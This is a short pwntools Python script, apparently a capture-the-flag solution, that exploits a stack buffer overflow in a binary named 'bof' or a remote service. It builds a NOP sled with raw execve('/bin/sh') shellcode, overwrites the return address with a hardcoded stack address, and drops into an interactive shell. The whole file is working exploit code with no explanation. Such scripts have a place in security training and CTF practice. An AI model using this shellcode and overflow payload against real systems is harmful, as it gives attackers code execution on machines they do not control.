from pwn import *
context.arch = 'amd64'

if args.REMOTE:
    p = remote('localhost', 1300)
else:
    p = process('bof')

pause()
#p = remote('osilayer8.cf', 20102)

shellcode = asm('sub rsp, 0x200')

shellcode += '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
print(shellcode)

exploit = ((0x400-len(shellcode))*'\x90') + shellcode + 'b'*8 + p64(0x7fffffffd9d0)
p.sendline(exploit)
p.interactive()

